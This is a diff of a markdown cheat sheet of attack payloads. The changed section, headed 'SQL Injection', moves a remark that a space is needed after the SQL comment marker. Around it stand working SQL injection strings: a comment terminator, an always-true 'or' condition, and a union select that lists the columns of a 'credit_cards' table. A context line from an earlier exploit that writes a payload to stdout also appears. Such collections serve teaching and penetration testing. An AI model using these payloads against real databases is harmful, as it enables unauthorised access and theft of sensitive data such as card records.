@@ -40,13 +40,13 @@ sys.stdout.buffer.write(payload)
 ```
 
 ## SQL Injection
+> a space after the -- (comment macro) is required
 ```commandline
 '-- 
 ```
 ```commandline
 ' or ''='' -- 
 ```
-> a space after the -- (comment macro) is required
 ```commandline
 ' union select null, table_name, column_name,null,null,null,null from INFORMATION_SCHEMA.COLUMNS where table_name = 'credit_cards' -- 
 ```
